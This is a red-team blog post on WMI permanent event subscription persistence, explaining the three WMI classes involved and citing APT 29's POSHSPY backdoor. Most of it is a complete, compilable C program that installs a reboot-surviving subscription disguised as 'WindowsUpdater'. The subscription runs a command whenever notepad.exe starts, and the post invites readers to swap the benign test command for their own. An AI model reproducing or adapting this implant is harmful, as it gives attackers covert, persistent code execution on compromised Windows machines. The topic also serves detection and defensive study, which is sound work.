---
layout: post
title: "7 days of Red- Day 2"
date: 2021-4-1 00:00:00 -0400
categories: Writeup
---


​      





##### Day 2:

## WMI Permanent Event Subscription Persistence Technique

Persistence techniques are used by attackers in order to maintain access on a compromised machine in case of a loss of the inital access vector.Procedures like this are used by most APTs and are displayed throughout various attacks.In particular this technique was utilized by APT 29 in a backdoor called POSHSPY.More details can be found here: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html in a writeup by FireEye.This technique using WMI Event Subscription is one that persists through reboots but requires adminstrator privileges. 

This Persistence Technique works by abusing the WMI service COM classes.There are three revelant WMI classes that are used in this technique.They are __EventFilter,CommandLineEventConsumer and __**FilterToConsumerBinding**. The Logic is that by using the EventFilter class you can set a Filter instance on certain Windows Events, and when that Event occurs it triggers the CommandLineEventConsumer class's instance which contains a command that will be executed. The last class FilterToConsumerBinding just ties both the filter instance and the consumer instance together so the event can trigger the consumer instance and execute malcious commands. In WMI selecting an event uses the WQL query language, which is a lot like SQL syntax. For example to place a filter on anytime a notepad process is created you can use, ***SELECT \* From InstanceCreationEvent WITHIN 5 WHERE TARGETINSTANCE ISA "Win32_Process" AND TARGETINSTANCE.NAME="notepad.exe"***.
The above query translates to select all events from the __InstanceCreationEvent class within the polling interval of 5 seconds where the TargetInstance object is a Win32_Process and its name is notepad.exe.This checks if there any changes in the Win32_Process class that are named notepad.exe and returns them.You can use WQL to trigger on almost any Windows Event imaginable ranging from CD-ROMs to keyboard strokes using the CIMWin32 Provider and its numerous classes.

C Code: Ported into C from MDsec's article on this topic: https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/  (Used CommandLineEventConsumer instead of ActiveScriptEventConsumer)

Compile with this command: `gcc WmiSub.c -o Wmisub.exe -lole32 -loleaut32 -lwbemuuid`

If you run this code, all it does is make a test file saying success in your C:\, after you open notepad.exe.

```c
#define _WIN32_DCOM
#include <wbemidl.h>
#include <windows.h>
#include <oleauto.h>
#include <stdio.h>

static CLSID CLSID_IWbem ={0x4590f811, 0x1d3a, 0x11d0, 0x89,0x1f, 0x00,0xaa,0x00,0x4b,0x2e,0x24};
static CLSID IID_IWbem ={0xdc12a687, 0x737f, 0x11cf, 0x88,0x4d, 0x00,0xaa,0x00,0x4b,0x2e,0x24};

int main(int argc,int **argv){

    IWbemLocator *pObject=NULL;
    IWbemServices *pServices =NULL;
    IWbemClassObject *pFilter=NULL;
    IWbemClassObject *pConsumer=NULL;
    IWbemClassObject *pBinder=NULL;
    IWbemClassObject *pBinderInstance=NULL;
    IWbemClassObject *pFilterInstance=NULL;
    IWbemClassObject *pConsumerInstance=NULL;
    BSTR resource =SysAllocString(L"ROOT\\SUBSCRIPTION");
    BSTR consumerclass=SysAllocString(L"CommandLineEventConsumer");
    BSTR filterclass =SysAllocString(L"__EventFilter");
    BSTR binderclass=SysAllocString(L"__FilterToConsumerBinding");
    HRESULT hres;
    //1.Initialize COM
    hres=CoInitializeEx(0,COINIT_MULTITHREADED);
    if (FAILED(hres)){
        printf("COM was not successfully initialized\n");
        goto cleanup;
    }else{
        printf("COM was initialized\n");
    }

    //2.Initialize COM Security
    hres=CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE,NULL);
    if (FAILED(hres)){
         printf("COM Security was not properly initialized\n");
         goto cleanup;
   }else{
        printf("COM Security was initialized\n");
   }

   //3.Initialize IWbemLocator
   hres=CoCreateInstance(&CLSID_IWbem,0,CLSCTX_INPROC_SERVER,&IID_IWbem,(LPVOID*)&pObject);
   if (FAILED(hres)){
       printf("IWbemLocator Object was not properly initialized\n");
       goto cleanup;

  }else{
    printf("IWbemLocator was initialized\n");
  }


  //4.Connect to WMI and get pointer to IWbemServices
  hres=pObject->lpVtbl->ConnectServer(pObject,resource,NULL,NULL,NULL,0,NULL,NULL,&pServices);
  if (FAILED(hres)){
    printf("IWbemServices pointer was not properly attained ");
    pObject->lpVtbl->Release(pObject);
  }else{
    printf("IWbemServices pointer was attained ");
  }
  //5.Set Security Attributes on the IWbemServices proxy so it can impersonate the client
  hres=CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
   if(FAILED(hres)){
    printf("Proxy Security settings not set");
    printf("1%d\n",GetLastError());
    goto cleanup;
   }else{
     printf("Proxy Security settings set");
   }
    // 6.Attain WMI FILTER CLASS
    hres=pServices->lpVtbl->GetObject(pServices,filterclass,0,NULL,&pFilter,NULL);
    if (FAILED(hres)){
       printf("Filter class was not properly retrieved");
       goto cleanup;
    }else{
       printf("Filter class was properly retrieved\n");
    }
    //7.Spawn an Instance of Filter Class
    hres=pFilter->lpVtbl->SpawnInstance(pFilter,0,&pFilterInstance);
    if (FAILED(hres)){
        printf("Filter class instance wasn't properly spawned\n");
    }else{
        printf("Filter class instance was properly spawned\n");
    }
    //8.Setting __EventFilter Class Name Field
    VARIANT v;
    VariantInit(&v);
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WindowsUpdater");

    BSTR Name=SysAllocString(L"Name");
    pFilterInstance->lpVtbl->Put(pFilterInstance,Name,0,&v,0);
    VariantClear(&v);

    //9.Setting __EventFilter Class Query Field
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"Select * From __InstanceCreationEvent Within 5 Where TargetInstance Isa \"Win32_Process\" And TargetInstance.Name = \"notepad.exe\"");

    BSTR Query =SysAllocString(L"Query");
    pFilterInstance->lpVtbl->Put(pFilterInstance,Query,0,&v,0);
    VariantClear(&v);


    //10.Setting __EventFilter Class QueryLanguage Field
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WQL");

    BSTR QueryLanguage =SysAllocString(L"QueryLanguage");
    pFilterInstance->lpVtbl->Put(pFilterInstance,QueryLanguage,0,&v,0);
    VariantClear(&v);

    //11.Setting __EventFilter Class EventNameSpace Field
    VariantInit(&v);
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"root\\cimv2");

    BSTR EventNameSpace =SysAllocString(L"EventNameSpace");
    pFilterInstance->lpVtbl->Put(pFilterInstance,EventNameSpace,0,&v,0);
    VariantClear(&v);

    hres=pServices->lpVtbl->PutInstance(pServices,pFilterInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified Event Filter Class Instance was unable to be written\n");
        goto cleanup;
    }else{
        printf("Event Filter class instance was properly written\n");

    }


    //12.Getting CommandLineEventConsumer Class
    hres=pServices->lpVtbl->GetObject(pServices,consumerclass,0,NULL,&pConsumer,NULL);
    if (FAILED(hres)){
        printf("CommandLineEventConsumer class was not properly connected ");
        goto cleanup;
    }else{
       printf("CommandLineEventConsumer class was properly connected\n");
    }
    //13.Spawning CommandLineEventConsumer Class
    hres=pConsumer->lpVtbl->SpawnInstance(pConsumer,0,&pConsumerInstance);
    if (FAILED(hres)){
        printf("Consumer class instance wasn't properly spawned\n");
    }else{
        printf("Consumer class instance was properly spawned\n");
    }
    //14.Setting CommandLineEventConsumer Class Name Field

    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WindowsUpdater");

    BSTR ConsumerName =SysAllocString(L"Name");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerName,0,&v,0);
    VariantClear(&v);

    //15.Setting CommandLineEventConsumer Class RunInteractively Field

    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"false");

    BSTR ConsumerRunI =SysAllocString(L"RunInteractively");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerRunI,0,&v,0);
    VariantClear(&v);


    //16.Setting CommandLineEventConsumer Class CommandLineTemplate Field

    V_VT(&v)=VT_BSTR;
    //PUT YOUR COMMAND IN THIS LINE
    V_BSTR(&v)=SysAllocString(L"cmd /C echo Success >> C:\\test.txt");

    BSTR ConsumerCommand =SysAllocString(L"CommandLineTemplate");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerCommand,0,&v,0);


    hres=pServices->lpVtbl->PutInstance(pServices,pConsumerInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified Event CommandLineEventConsumer Instance was unable to be written\n");
        goto cleanup;
    }else{
        printf("CommandLineEventConsumer class instance was properly written\n");

    }


    //17.Getting __FiltertoConsumerBinding Class
    hres=pServices->lpVtbl->GetObject(pServices,binderclass,0,NULL,&pBinder,NULL);
    if (FAILED(hres)){
        printf("__FiltertoConsumerBinding class was not properly connected ");
        goto cleanup;
    }else{
       printf("__FilterToConsumerBinding class was properly connected\n");
    }
    //18.Spawning Binder Class
     hres=pBinder->lpVtbl->SpawnInstance(pBinder,0,&pBinderInstance);
     if (FAILED(hres)){
        printf("FilterToConsumerBinding class instance wasn't properly spawned\n");
    }else{
        printf("FilterToConsumerBinding class instance was properly spawned\n");
    }
    //19.Setting the EventFilter rel path
     V_VT(&v)=VT_BSTR;
     V_BSTR(&v)=SysAllocString(L"__EventFilter.Name=\"WindowsUpdater\"");;

    BSTR Filter = SysAllocString(L"Filter");
    pBinderInstance->lpVtbl->Put(pBinderInstance,Filter,0,&v,0);
    VariantClear(&v);

    //20.Setting the CommandLineEventConsumer rel path
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"CommandLineEventConsumer.Name=\"WindowsUpdater\"");;
    BSTR Consumer = SysAllocString(L"Consumer");
    pBinderInstance->lpVtbl->Put(pBinderInstance,Consumer,0,&v,0);
    VariantClear(&v);
    //21.Saving changes for Modified __FilterToConsumerBinding Instance
    pServices->lpVtbl->PutInstance(pServices,pBinderInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified FilterToConsumerBinding class instance wasn't properly written\n");
        goto cleanup;

    }else{
        printf("FilterToConsumerBinding class instance was properly written\n");
    }
    //CLEANUP
    if(pFilterInstance){
        pFilterInstance->lpVtbl->Release(pFilterInstance);
        pFilterInstance =NULL;
    }
    if(pBinderInstance){
        pBinderInstance->lpVtbl->Release(pBinderInstance);
        pBinderInstance=NULL;
    }
    if(pConsumerInstance){
        pConsumerInstance->lpVtbl->Release(pConsumerInstance);
        pConsumerInstance =NULL;
    }

    pObject->lpVtbl->Release(pObject);
    pServices->lpVtbl->Release(pServices);
    CoUninitialize();

cleanup:
    if (pConsumer){
        pConsumer->lpVtbl->Release(pConsumer);
    }
    if(pFilter){
        pFilter->lpVtbl->Release(pFilter);
    }
    if(pBinder){
        pBinder->lpVtbl->Release(pBinder);
    }
    if(pServices){
        pServices->lpVtbl->Release(pServices);
    }
    if(pObject){
        pObject->lpVtbl->Release(pObject);
    }



return 1;


}
```

ref: https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/

https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event
